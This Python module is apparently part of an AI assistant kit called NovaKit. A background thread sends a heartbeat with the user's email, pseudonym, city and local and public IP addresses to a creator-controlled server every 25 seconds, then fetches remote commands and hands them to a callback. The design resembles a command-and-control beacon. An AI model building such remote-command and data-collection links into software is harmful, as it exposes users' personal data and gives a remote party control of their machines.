"""Lien client ↔ serveur créateur (heartbeat + commandes distantes)."""

from __future__ import annotations

import json
import threading
import time
import urllib.request
import uuid
from pathlib import Path

from config import DATA_DIR, ENV_FILE, KIT_VERSION, NOM_IA, lire_profil
from core.notify_creator import charger_creator

CLIENT_FILE = DATA_DIR / "client_id.txt"
_POLL_SEC = 25
_started = False


def get_client_id() -> str:
    DATA_DIR.mkdir(exist_ok=True)
    if CLIENT_FILE.exists():
        cid = CLIENT_FILE.read_text(encoding="utf-8").strip()
        if cid:
            return cid
    # Legacy dans .env
    try:
        from config import _env
        cid = _env("CLIENT_ID")
        if cid:
            CLIENT_FILE.write_text(cid, encoding="utf-8")
            return cid
    except Exception:
        pass
    cid = uuid.uuid4().hex
    CLIENT_FILE.write_text(cid, encoding="utf-8")
    # Persiste aussi dans .env si possible
    try:
        if ENV_FILE.exists():
            txt = ENV_FILE.read_text(encoding="utf-8")
            if "CLIENT_ID=" not in txt:
                ENV_FILE.write_text(txt.rstrip() + f"\nCLIENT_ID={cid}\n", encoding="utf-8")
    except Exception:
        pass
    return cid


def _ip_public() -> str:
    for url in (
        "https://api.ipify.org",
        "https://ifconfig.me/ip",
    ):
        try:
            with urllib.request.urlopen(url, timeout=4) as r:
                ip = r.read().decode("utf-8", errors="ignore").strip()
                if ip and len(ip) < 64:
                    return ip
        except Exception:
            continue
    return ""


def collecter_reseau() -> dict:
    from remote.network import obtenir_ip_wifi
    return {
        "ip_local": obtenir_ip_wifi(),
        "ip_public": _ip_public(),
    }


def _base_url() -> str:
    return (charger_creator().get("online_api_url") or "").strip().rstrip("/")


def _post(url: str, data: dict) -> dict:
    body = json.dumps(data).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=body,
        headers={"Content-Type": "application/json", "User-Agent": f"NovaKit/{KIT_VERSION}"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=12) as resp:
        return json.loads(resp.read().decode("utf-8", errors="ignore") or "{}")


def _get(url: str) -> dict:
    req = urllib.request.Request(url, headers={"User-Agent": f"NovaKit/{KIT_VERSION}"})
    with urllib.request.urlopen(req, timeout=12) as resp:
        return json.loads(resp.read().decode("utf-8", errors="ignore") or "{}")


def heartbeat_et_commandes(on_command=None) -> list:
    """Envoie un heartbeat et récupère les commandes créateur."""
    base = _base_url()
    if not base.startswith("http"):
        return []
    profil = lire_profil()
    net = collecter_reseau()
    cid = get_client_id()
    payload = {
        "client_id": cid,
        "pseudo": profil.get("pseudo") or "",
        "email": profil.get("email") or "",
        "nom_ia": profil.get("nom_ia") or NOM_IA,
        "ville": profil.get("ville") or "",
        "version": KIT_VERSION,
        "ip_local": net.get("ip_local") or "",
        "ip_public": net.get("ip_public") or "",
        "ip": net.get("ip_public") or net.get("ip_local") or "",
        "online": True,
    }
    try:
        _post(f"{base}/api/client/heartbeat", payload)
    except Exception as exc:
        print(f"[creator_link] heartbeat: {exc}")
        return []
    try:
        data = _get(f"{base}/api/client/commands?client_id={cid}")
        cmds = data.get("commands") or []
    except Exception as exc:
        print(f"[creator_link] commands: {exc}")
        return []
    for cmd in cmds:
        if on_command:
            try:
                on_command(cmd)
            except Exception as exc:
                print(f"[creator_link] exec: {exc}")
    return cmds


def demarrer_poll(on_command) -> None:
    global _started
    if _started:
        return
    if not _base_url().startswith("http"):
        return
    _started = True

    def _loop():
        # Premier passage un peu différé
        time.sleep(8)
        while True:
            try:
                heartbeat_et_commandes(on_command)
            except Exception as exc:
                print(f"[creator_link] {exc}")
            time.sleep(_POLL_SEC)

    threading.Thread(target=_loop, daemon=True, name="creator-link").start()
